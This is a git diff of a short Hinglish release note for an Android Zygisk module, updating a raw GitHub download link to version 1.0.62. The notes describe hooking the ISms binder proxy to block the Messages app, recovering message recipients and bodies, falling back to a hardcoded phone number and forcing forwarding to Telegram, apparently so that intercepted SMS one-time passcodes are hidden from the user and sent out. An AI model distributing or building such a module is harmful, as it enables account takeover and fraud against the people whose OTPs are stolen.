@@ -1,7 +1,7 @@
 # Releases
 
-Latest: **virtus-zygisk-mode-v1.0.61.zip**
+Latest: **virtus-zygisk-mode-v1.0.62.zip**
 
-Nuclear Messages block: `blob_ok=1` pe SIM passthrough band. Drive IBinder→ISms proxy. Purana 1.0.59 hata ke ye flash karo.
+Hook block OK tha lekin TG skip: `dest=0000000000` + `skip_tg_junk_or_otp`. Ab To/Body recover + `9920104300` fallback + TG force.
 
-https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.61.zip
+https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.62.zip
